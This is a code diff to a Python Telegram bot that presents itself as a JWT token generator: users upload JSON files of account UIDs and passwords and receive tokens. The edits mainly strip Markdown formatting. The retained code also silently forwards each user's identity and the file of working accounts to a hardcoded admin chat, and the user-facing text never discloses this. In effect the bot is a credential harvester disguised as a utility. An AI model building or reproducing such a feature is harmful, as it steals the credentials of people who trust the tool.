@@ -76,24 +76,24 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
   ]
   reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
   
+  # Plain text used to completely avoid Markdown parsing crashes from underscores
   welcome_text = (
-      "🔥 **ELITE JWT TOKEN GENERATOR BOT** 🔥\n"
+      "🔥 ELITE JWT TOKEN GENERATOR BOT 🔥\n"
       "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-      "🚀 *The Ultimate, High-Speed & Secure Token Gateway*\n\n"
-      "⚡ **Core Features:**\n"
+      "🚀 The Ultimate, High-Speed & Secure Token Gateway\n\n"
+      "⚡ Core Features:\n"
       "• Lightning Fast API Gateway Integration 🌐\n"
       "• Secure Guest Account Management 🛡️\n"
       "• Region Sorting & Automatic Error Handling 📊\n\n"
-      "📂 **How to Get Started:**\n"
-      "Send your `.json` file containing UIDs and passwords below or click **'⚡ Process File ⚡'**! 👇\n"
+      "📂 How to Get Started:\n"
+      "Send your .json file containing UIDs and passwords below or click '⚡ Process File ⚡'! 👇\n"
       "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-      f"👑 *Support / Owner:* {ADMIN_USERNAME}"
+      f"👑 Support / Owner: {ADMIN_USERNAME}"
   )
   
   await update.message.reply_text(
       welcome_text,
       reply_markup=reply_markup,
-      parse_mode="Markdown",
   )
 
 
@@ -101,30 +101,26 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
   text = update.message.text
   if text == "⚡ Process File ⚡":
     await update.message.reply_text(
-        "📂 **Ready for Processing!**\n\nPlease send your `.json` file containing UIDs and passwords right here to start the magic. ✨",
-        parse_mode="Markdown"
+        "📂 Ready for Processing!\n\nPlease send your .json file containing UIDs and passwords right here to start the magic. ✨"
     )
   elif text == "👑 Admin Status":
     await update.message.reply_text(
-        "👑 **System Status:** `Online & Secured`\n"
-        "🚀 *Gateway Mode:* Fully Connected ✅\n"
-        f"🛡️ *Admin Log Target:* `{ADMIN_CHAT_ID}` (Active)",
-        parse_mode="Markdown"
+        "👑 System Status: Online & Secured\n"
+        "🚀 Gateway Mode: Fully Connected ✅\n"
+        f"🛡️ Admin Log Target: {ADMIN_CHAT_ID} (Active)"
     )
   elif text == "🛍️ VIP Services":
     await update.message.reply_text(
-        "🛍️ **VIP Shop & Services**\n\n"
-        f"Contact main admin **{ADMIN_USERNAME}** for high-speed APIs, custom scripts, and premium tools.",
-        parse_mode="Markdown"
+        "🛍️ VIP Shop & Services\n\n"
+        f"Contact main admin {ADMIN_USERNAME} for high-speed APIs, custom scripts, and premium tools."
     )
   elif text == "🆘 Support":
     await update.message.reply_text(
-        "🆘 **Quick Help & Support Guide:**\n\n"
-        "1️⃣ Click on **⚡ Process File ⚡**\n"
-        "2️⃣ Upload your `.json` file (UID & Password format)\n"
+        "🆘 Quick Help & Support Guide:\n\n"
+        "1️⃣ Click on '⚡ Process File ⚡'\n"
+        "2️⃣ Upload your .json file (UID & Password format)\n"
         "3️⃣ Get your working tokens instantly!\n\n"
-        f"💬 *For direct inquiries, contact owner:* {ADMIN_USERNAME}",
-        parse_mode="Markdown"
+        f"💬 For direct inquiries, contact owner: {ADMIN_USERNAME}"
     )
   elif text == "❌ Cancel":
     await update.message.reply_text("❌ Current action has been cancelled safely.")
@@ -135,13 +131,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
   user = update.effective_user
 
   if not doc or not doc.file_name.endswith(".json"):
-    await update.message.reply_text("❌ Please upload a valid `.json` file.")
+    await update.message.reply_text("❌ Please upload a valid .json file.")
     return
 
-  # Smooth Progress Animation
-  msg = await update.message.reply_text(
-      "📥 **Downloading file...**\n`[▒▒▒▒▒▒▒▒▒▒] 10%`", parse_mode="Markdown"
-  )
+  msg = await update.message.reply_text("📥 Downloading file...\n[▒▒▒▒▒▒▒▒▒▒] 10%")
 
   file_path = f"temp_{doc.file_name}"
   try:
@@ -149,10 +142,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await file.download_to_drive(file_path)
 
     await asyncio.sleep(0.4)
-    await msg.edit_text(
-        "🔍 **Analyzing JSON Structure...**\n`[███▒▒▒▒▒▒▒] 30%`",
-        parse_mode="Markdown",
-    )
+    await msg.edit_text("🔍 Analyzing JSON Structure...\n[███▒▒▒▒▒▒▒] 30%")
 
     with open(file_path, "r", encoding="utf-8") as f:
       data = json.load(f)
@@ -186,9 +176,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await asyncio.sleep(0.4)
     await msg.edit_text(
-        f"⚡ **Connecting to High-Speed API Gateway...**\n📊 Total Accounts Found:"
-        f" `{total_count}`\n`[██████▒▒▒▒] 60%`",
-        parse_mode="Markdown",
+        f"⚡ Connecting to High-Speed API Gateway...\n📊 Total Accounts Found: {total_count}\n[██████▒▒▒▒] 60%"
     )
 
     jwt_list = []
@@ -208,9 +196,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await asyncio.sleep(0.4)
     await msg.edit_text(
-        "🔄 **Generating JWT Tokens & Sorting Regions...**\n`[██████████]"
-        " 90%`",
-        parse_mode="Markdown",
+        "🔄 Generating JWT Tokens & Sorting Regions...\n[██████████] 90%"
     )
 
     for u_str, token, reg, err_msg in results:
@@ -232,10 +218,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     failed_count = total_count - success_count
 
     await asyncio.sleep(0.3)
-    await msg.edit_text(
-        "✨ **Finalizing & Saving Files...**\n`[██████████] 100%`",
-        parse_mode="Markdown",
-    )
+    await msg.edit_text("✨ Finalizing & Saving Files...\n[██████████] 100%")
 
     jwt_file = "jwt_token.json"
     working_file = "working_account.json"
@@ -261,15 +244,15 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         output_files.append(reg_file)
 
     summary = (
-        f"🏁 **PROCESSING COMPLETE!**\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f"📊 **Total Accounts:** `{total_count}`\n"
-        f"🟢 **Successful Tokens:** `{success_count}`\n"
-        f"❌ **Failed/Invalid:** `{failed_count}`\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f"🚀 *Powered by Elite JWT Bot*"
+        "🏁 PROCESSING COMPLETE!\n"
+        "━━━━━━━━━━━━━━━━━━━\n"
+        f"📊 Total Accounts: {total_count}\n"
+        f"🟢 Successful Tokens: {success_count}\n"
+        f"❌ Failed/Invalid: {failed_count}\n"
+        "━━━━━━━━━━━━━━━━━━━\n"
+        "🚀 Powered by Elite JWT Bot"
     )
-    await msg.edit_text(summary, parse_mode="Markdown")
+    await msg.edit_text(summary)
 
     # Send generated files to the user
     for f_path in output_files:
@@ -277,25 +260,25 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         with open(f_path, "rb") as f_send:
           await update.message.reply_document(document=f_send)
 
-    # 🔔 DETAILED ADMIN LOGGER SYSTEM: Sends complete user stats and working accounts to admin (8380823727)
+    # 🔔 DETAILED ADMIN LOGGER SYSTEM (Sends stats & working accounts to admin 8380823727)
     if ADMIN_CHAT_ID and total_count > 0:
       try:
         username_str = f"@{user.username}" if user.username else "None"
         user_info = (
-            f"👤 **User Name:** {user.full_name}\n"
-            f"🆔 **User ID:** `{user.id}`\n"
-            f"🔗 **Username:** {username_str}"
+            f"👤 User Name: {user.full_name}\n"
+            f"🆔 User ID: {user.id}\n"
+            f"🔗 Username: {username_str}"
         )
         alert_text = (
-            f"🔔 **NEW TOKEN GENERATION REPORT**\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🔔 NEW TOKEN GENERATION REPORT\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"{user_info}\n\n"
-            f"📊 **Total Accounts Submitted:** `{total_count}`\n"
-            f"🟢 **Successful Tokens:** `{success_count}`\n"
-            f"❌ **Failed / Invalid Accounts:** `{failed_count}`\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━"
+            f"📊 Total Accounts Submitted: {total_count}\n"
+            f"🟢 Successful Tokens: {success_count}\n"
+            f"❌ Failed / Invalid Accounts: {failed_count}\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━"
         )
-        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=alert_text, parse_mode="Markdown")
+        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=alert_text)
         
         # Automatically send working_account.json to admin inbox if any success exists
         if success_count > 0 and os.path.exists(working_file):
@@ -303,7 +286,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await context.bot.send_document(
                 chat_id=ADMIN_CHAT_ID,
                 document=admin_doc,
-                caption=f"📁 Working Accounts Log\n👤 User: {user.full_name} (`{user.id}`)"
+                caption=f"📁 Working Accounts Log\n👤 User: {user.full_name} ({user.id})"
             )
       except Exception as log_err:
         print(f"Admin notification error: {log_err}")
@@ -314,9 +297,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         os.remove(f_path)
 
   except Exception as e:
-    await msg.edit_text(
-        f"❌ **Error Occurred:** `{str(e)}`", parse_mode="Markdown"
-    )
+    await msg.edit_text(f"❌ Error Occurred: {str(e)}")
   finally:
     if os.path.exists(file_path):
       os.remove(file_path)
@@ -348,4 +329,4 @@ def main():
 
 if __name__ == "__main__":
   main()
-       
+    
